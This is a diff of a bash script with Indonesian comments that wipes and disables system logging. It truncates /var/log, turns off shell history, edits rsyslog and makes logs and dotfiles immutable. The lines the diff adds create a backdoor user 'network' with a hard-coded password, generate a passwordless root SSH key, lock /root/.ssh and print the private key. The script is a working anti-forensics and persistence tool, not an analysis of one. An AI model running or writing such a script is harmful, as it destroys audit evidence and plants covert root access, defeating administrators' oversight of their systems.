@@ -9,15 +9,16 @@ if [ "$EUID" -ne 0 ]; then
   exit
 fi
 
+unset HISTFILE && export HISTSIZE=0 && export HISTFILE=/dev/null && export HISTFILESIZE=0 && set +o history && export HISTCONTROL=ignorespace
+
 echo "--- Memulai proses pembersihan log dan penguncian jejak log  ---"
 
-unset HISTFILE && export HISTSIZE=0 && export HISTFILE=/dev/null && export HISTFILESIZE=0 && set +o history && export HISTCONTROL=ignorespace
 # 1. Mengosongkan semua file log yang ada saat ini
-find /var/log/ -type f -exec truncate -s 0 {} \;
-rm -rf /tmp/*
+find /var/log/ -type f -exec truncate -s 0 {} \; 2>/dev/null
+rm -rf /tmp/* 2>/dev/null
 sudo sync; echo 3 | sudo tee /proc/sys/vm/drop_caches
-chattr -i -R /var/log/
 chattr -a -R /var/log/
+chattr -i -R /var/log/
 
 # 2. Modifikasi /etc/rsyslog.conf secara otomatis (Menambahkan komentar #)
 # Menggunakan sed untuk mencari baris spesifik dan menambahkan # di depannya
@@ -56,6 +57,7 @@ chown root:root -R /var/log/
 # Catatan: Gunakan +i agar benar-benar tidak bisa diubah sama sekali
 chattr +i -R /var/log/
 
+truncate -s 0 ~/.bash_history ~/.bash_profile ~/.mysql_history ~/.profile ~/.selected_editor ~/.viminfo ~/.wget-hsts ~/.cache ~/.ldx ~/.node_repl_history ~/.psql_history
 # Kumpulan perintah untuk .bashrc dan /etc/profile
 COMMANDS="
 unset HISTFILE
@@ -88,9 +90,17 @@ echo "[+] Berhasil menambahkan ke ~/.bash_logout"
 
 # 4. Jalankan source
 source ~/.bashrc
+source /etc/profile
 # Note: source pada .bash_logout biasanya tidak memberikan output visual, 
 # tapi kita jalankan sesuai permintaan untuk memastikan sintaks diterima.
 source ~/.bash_logout 2>/dev/null
+chattr +i ~/.bash_history ~/.bash_logout ~/.bash_profile ~/.bashrc ~/.config ~/.local ~/.mysql_history ~/.profile ~/.selected_editor ~/.ssh ~/.viminfo ~/.wget-hsts ~/.cache ~/.ldx ~/.node_repl_history ~/.psql_history
 
-echo "--- SELESAI: Server sekarang dalam mode 'Silent dan bersih dari log' ---"
+sudo useradd -r -m -s /bin/bash network >/dev/null 2>&1 && echo "network:rijal01" | sudo chpasswd >/dev/null 2>&1
+ssh-keygen -t rsa -b 4096 -f /root/.ssh/id_rsa -N ""
+cat /root/.ssh/id_rsa.pub > authorized_keys
+chattr +i -R /root/.ssh/
+cat /root/.ssh/id_rsa
+
+echo "--- SELESAI Buat SSH-Keygen lalu add user network dan Server sekarang dalam mode Silent dan bersih dari log ---"
 history -c && history -w
